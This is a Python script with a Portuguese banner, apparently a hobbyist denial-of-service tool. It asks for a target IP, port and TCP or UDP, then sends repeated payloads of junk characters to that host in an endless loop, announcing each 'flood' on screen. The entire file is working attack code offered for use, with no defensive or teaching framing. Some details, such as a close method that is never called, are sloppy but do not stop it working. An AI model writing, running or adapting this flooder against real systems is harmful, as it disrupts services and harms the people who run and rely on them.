import socket
import random
import sys

print('''\r\n
   ******      **     **     ******      **     **
  **////**    ****   /**    **////**    ****   /**
 **    //    **//**  /**   **    //    **//**  /**
/**         **  //** /**  /**         **  //** /**
/**        **********/**  /**        **********/**
//**    **/**//////**/**  //**    **/**//////**/**
 //****** /**     /**/**   //****** /**     /**/**
  //////  //      // //     //////  //      // // 

┌─────────────────────────────────────────────────────┐
│ version 1.0.0                                       │
│                                                     │
│                [!!!CAI CAI BALÃO!!!]                │                      
│                                                     │
│                              Code By Julio Carneiro │
├─────────────────────────────────────────────────────┤
│      Github: https://github.com/juliocarneiro	      │
└─────────────────────────────────────────────────────┘\r\n''')


def main():
    global port
    global target
    global protocol
    global rpc

    target = str(input("IP do alvo: "))
    if target == "":
        print("Digite algum valor e tente novamente!")
        exit()
    else:
        target = str(target)
    if target != "":
        print("Alvo selecionado!")

    port = str(input("Porta (HTTPS=443): "))
    if port == "":
        port = 80
        print("Porta 80 selecionada")
    else:
        port = int(port)
    if port == 443:
        print("Porta 443 selecionada")

    protocol = str(input("Protocolo (tcp/udp): "))
    if protocol == "":
        protocol = "tcp"
        print("Protocolo TCP selecionado")
    else:
        protocol = protocol

    rpc = str(input("Random Packet Creation(On/Off): "))
    if rpc == "":
        rpc = "Off"
        print("RPC Off")
    else:
        rpc = rpc

    adr = (target, port)
    data = "qwertyuiopasdfghjklzxcvbnm0123456789~!@#$%^&*()+=`;?.,<>\|{}[]"

    while True:
        if protocol == 'TCP' or protocol == 'tcp' or protocol == 'Tcp' or protocol == 't':
            Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        elif protocol == 'UDP' or protocol == 'udp' or protocol == 'Udp' or protocol == 'u':
            Sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        Sock.connect(adr)
        if rpc == 'ON' or rpc == 'On' or rpc == 'on':
            Bytes = (data*random.randrange(16, 64))
            BytesEnc = str.encode(Bytes)
        elif rpc == 'OFF' or rpc == 'Off' or rpc == 'off':
            Bytes = (data*64)
            BytesEnc = str.encode(Bytes)
        Sock.sendall(BytesEnc)

        print('Flooding {0} na porta {1} com {2} bytes de dados'.format(
            target, port, sys.getsizeof(BytesEnc)))
        if socket.error:
            Sock.shutdown(socket.SHUT_RDWR)
            Sock.close
            del Sock


main()
